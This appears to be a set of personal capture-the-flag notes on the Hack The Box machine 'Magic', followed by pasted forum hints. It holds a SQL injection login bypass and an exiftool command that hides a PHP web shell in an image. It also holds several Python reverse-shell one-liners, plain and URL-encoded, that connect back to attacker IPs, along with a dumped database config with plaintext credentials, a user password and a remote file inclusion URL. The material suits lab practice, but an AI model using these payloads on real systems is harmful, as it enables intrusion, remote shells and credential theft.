nmap as always 

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


attempt some basic sqli at login

https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

http://10.10.10.185/login.php

' or 1=1# for user
' or 1=1# for pass

https://www.exploit-db.com/exploits/29427


root@kali:~/Downloads# exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' test.jpg_original
https://github.com/xapax/security/blob/master/bypass_image_upload.md





python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.14.12%22%2C4321))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27

python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.15.1%22,4321));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27

http://10.10.10.185/images/uploads/myimage.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.15.92%22,4321));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27


http://10.10.10.185/images/uploads/middle.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.168%22,4789));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27


found user theseus


www-data@ubuntu:/var/www/Magic$ cat db.php5
cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }

python3 -c 'import pty; pty.spawn("/bin/bash")'

does not work


su - theseus
Th3s3usW4sK1ng  



for root, I think that using anacron is my best move.
https://www.securifera.com/blog/2017/01/28/a-less-dirty-cow/








netstat -tulpn



    ROOTED!

    I love this kind of box and this one in particular make me learn something new! Here some hints:

    Foothold: do you know an image can hide a lot of information? Maybe you just need the right tool.
    User: just look around and you'll find the first juicy information, that information can be used only in one way so let's do it.
    Root: know how Linux prioritize commands execution is the key, then I suggest you to use some tools like pspy and strings to better understand what's happening.


    http://www.example.com/path/admin/list_members.php?_config[site_path]=http://www.example2.com

    http://10.10.10.185/path/admin/list_members.php?_config[site_path]=http://10.10.10.185


May 1 Report Spoiler

Finally Rooted.
This box is very much unique. I struggled for both User and Root but the knowledge I got was huge. Thanks to @FunkyMcBeef for helping/guiding me throughout the process of root

Initial foothold:
1.You know how to bypass login using basic things. (really a child's play)
2. You have to upload something to get the shell
3. Trick is not everything works. For me all the basic methods failed. But then I watched one youtube video and learned a new method to craft payload. Cat has some powerful magic I would say.

User:
1. Once you get shell, you know where to look first.
2. Extract something but you don't have access to the tools.
3. But there are other ways to do it. (really its in front of you)

Root:
OK this is not easy
1. linpeas will really give you something (please read it line by line. I didn't and that's why I struggled)
2. check what really happens in the background
3. exploit it

I am very much descriptive here, hope haven't spoiled anything
